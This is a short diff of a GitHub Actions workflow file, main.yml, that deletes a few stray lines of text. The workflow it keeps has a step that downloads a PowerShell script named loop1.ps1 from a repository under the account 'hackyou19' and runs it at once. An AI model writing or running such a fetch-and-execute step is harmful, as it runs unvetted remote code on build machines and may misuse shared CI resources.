@@ -42,6 +42,3 @@ jobs:
       run: | 
         Invoke-WebRequest https://github.com/hackyou19/holatext/raw/main/loop1.ps1 -OutFile loop.ps1
         ./loop.ps1
-main.yml
-
-Affichage de main.yml
